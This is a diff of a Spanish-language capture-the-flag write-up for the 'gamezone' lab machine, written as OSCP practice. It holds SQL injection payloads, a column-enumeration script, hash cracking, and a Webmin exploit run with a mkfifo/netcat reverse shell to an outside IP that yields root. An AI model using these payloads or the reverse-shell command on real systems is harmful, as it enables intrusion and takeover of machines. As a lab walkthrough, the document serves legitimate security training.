@@ -11,30 +11,31 @@ Status: Complete
 IP: 10.10.190.112
 ---
 
-# Resolution summary
-- Text
-- Text
-
 ## Improved skills
 - OSINT
 - SQLI
 - enumeracion
 - Localizacion de exploits
+- python scripting
 
 ## Used tools
 - nmap
 - Google Images
-- sqlmap
+- python
+- bash
+- netcat 
 
 ---
 
-# Alcance
+# Introduccion
 
-Esta máquina es parte del aprendizaje en el camino para ser pentester. Por ende, nos van haciendo diferentes preguntas para completarla. Lo que nos solicitan es explotar una vulnerabilidad SQLI, ganar acceso a una app web, lograr acceso al equipo y una vez hagamos eso, escalar privilegios con metasploit. Yo voy hacerlo con metasploit y de forma manual ya que la idea de hacer estos writeups es lograr una soltura al momento de hacer reportes para la OSCP u otros afines. Es por eso que voy a dar mas informacion de la necesaria para resolver esta maquina ya que debemos pensar en que a un futuro cliente/certificacion le interesa todo lo que se pueda reportar y sea de utilidad. 
+Esta máquina es parte del aprendizaje en el camino para ser pentester. Por ende, nos van haciendo diferentes preguntas para completarla. 
+
+Lo que nos solicitan es explotar una vulnerabilidad SQLI, ganar acceso a una app web, lograr acceso al equipo y una vez hagamos eso, escalar privilegios con metasploit. Yo no usare metasploit porque no es una herramienta permitida en la OSCP y por ende, trato de no usarla si no es el unico recurso para explotar la maquina y el mismo caso con sqlmap. estas herramientas automatizadas son de muchisima utilidad al momento de una auditoria real. Pero, en estos casos de aprendizaje, es mejor utilizar nuestro conocimiento para resolverlas. Pero, no se limiten a su uso si no estan en proceso de certificarse como yo. 
 
 # Information Gathering
 
-En la información de la máquina, no se nos entrega a qué plataforma nos enfrentamos o, por lo menos, no lo he visto.
+En la información de la máquina, no se nos entrega a qué plataforma nos enfrentamos.
 
 Para saber a qué nos enfrentamos, podemos usar el comando _PING_ e identificar si es una máquina con Windows o Linux a través de su TTL.
 
@@ -186,7 +187,7 @@ $result = mysqli_query($con, $sql_query);
 
 Segun ese codigo, **que no es el de esta web** y que revisaremos cuando la explotemos. Podemos ver que si como usuario ponemos bob' or 1=1 -- - no hay nada que nos impida hacerlo ya que no se filtra en ningun lado el input y ademas, el valor que nosotros escribimos pasa directamente a la consulta. Por ende, se puede configurar una inyeccion sql. 
 
-Ahora, por que usamos "or 1=1" ? es porque debemos crearle una igualdad a la consulta para que nos saltemos el uso del password. Con ello, la consulta se convierte en valida y nos deja entrar. 
+Ahora, por que usamos "or 1=1" ?  porque con eso manipulamos la consulta de tal manera que siempre sea verdadera logrando modificar el comportamiento de la misma. En este caso, saltandonos la validacion de la clave del usuario
 
 Veamos como aplicarlo:
 
@@ -226,7 +227,7 @@ la respuesta que obtengo es:
 ![[Pasted image 20240720165547.png]]
 Dice que no conoce la columna y esto significa que la tabla no tiene 10 columnas. Otra cosa importante que estamos pasando por alto, es el tipo de vulnerabilidad que estamos explotando y es una inyeccion SQL basada en error. Saber esto es clave para posteriores payloads de **payloadallthethings** o para realizar busquedas por los errores que tengamos para conocer mas de la base de datos que estamos atacando.
 
-Este script nos ayuda a saber la cantidad de columnas que tenemos en la tabla de manera automatizada. Tambien sabremos los valores de las tablas para obtener las claves administrativas o posteriores payloads con revshell.
+Este script nos ayuda a saber la cantidad de columnas que tenemos en la tabla de manera automatizada. 
 
 ```python 
 from pwn import *
@@ -265,10 +266,6 @@ def busqueda_columnas():
 	if "Unknown column" not in response.text:
 		print(f"La tabla tiene {i} columnas")
 		break
- 
-
-def consulta_datos():
-	pass
 
 if __name__=='__main__':
 	busqueda_columnas()
@@ -278,7 +275,7 @@ La salida al ejecutar este script es la siguiente:
 
 ![[Pasted image 20240720181243.png]]
 
-Listo!, ya sabemos que la tabla tiene 3 columnas. Ahora, hay que ver cuales pueden ser inyectables y para eso vamos a utilizar burpsuite para conocer la version y el nombre de la base de datos. No podremos ver un tercer valor ya que la pagina web solo nos muestra dos campos. Pero, lo que podemos hacer es unir esos campos. De cualquier forma, con que uno nos arroje mas informacion es suficiente. 
+Listo!, ya sabemos que la tabla tiene 3 columnas. Ahora, hay que ver cuales pueden ser inyectables y para eso vamos a utilizar un union select con los 3 campos e iremos reemplazando cada campo con un valor para ver cual es inyectable o no. 
 
 Para ello haremos lo siguiente:
 
@@ -312,7 +309,7 @@ Como podemos ver, ahora si tenemos una salida en ambos campos de la tabla. Enton
 Si buscamos por la version de la base de datos en google, nos encontraremos con lo siguiente:
 
 ![[Pasted image 20240721015340.png]]
-Es una base de datos mysql 5.7 en ubuntu xenial. Ahora, continuemos viendo las bases de datos que tiene con el siguiente comando:
+Es una base de datos mysql 5.7 en ubuntu xenial. Ahora, continuemos viendo las tablas con los campos que tiene con el siguiente comando:
 
 ```sql
 ' UNION SELECT NULL, table_name, concat(column_name, ' - ', table_name) FROM information_schema.columns WHERE table_schema=database() -- -
@@ -336,7 +333,7 @@ si entramos a esta web: https://crackstation.net/ podremos ver este resultado al
 
 ![[Pasted image 20240721021657.png]]
 
-Como podemos ver, si pudimos romper ese hash y tenemos nuestra clave. Pero, si queremos hacerlo con john y rockyou o con hashcat debemos utilizar los siguientes comandos:
+Como podemos ver, si pudimos romper ese hash y tenemos nuestra clave. Pero, si queremos hacerlo con john y rockyou  debemos utilizar los siguientes comandos:
 
 
 ```bash
@@ -645,6 +642,7 @@ if (window != window.top) {
 <br>
 </body></html>
 ```
+Al hacerle un curl al localhost:10000, nos damos cuenta que nos entrega una pagina web. 
 
 para traerlo, solo aplicamos este comando:
 
@@ -668,6 +666,7 @@ Con esto ya podemos responder las preguntas de la exposicion del servicio:
 
 ahora nos falta escalar privilegios. Para ello, debemos revisar la version de este webmin y ver que nos trae. 
 
+Nos trajo este script:
 
 ```python
 #!/usr/bin/env python3
@@ -828,7 +827,7 @@ lo nombramos y usamos el siguiente comando:
 python jm.py -t localhost -p 80 -U agent47 -P videogamer124 -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.13.62.1 443 >/tmp/f"
 ```
 
-Nos ponemos en escucha con netcat:
+Usamos el mkfifo y nos ponemos en escucha con netcat:
 
 ```bash
 sudo nc -lvnp 443 
@@ -840,7 +839,7 @@ finalmente recibimos la shell:
 root@gamezone:/usr/share/webmin/file/# 
 ```
 
-le hacemos un tratamiento:
+le hacemos un tratamiento y vemos con el comando which si tenemos python o python3. Si lo tenemos, podemos seguir con los comandos de abajo y si no tenemos python podemos usar **script /dev/null -c bash**
 
 ```bash
 python -c 'import pty;pty.spawn("/bin/bash")'
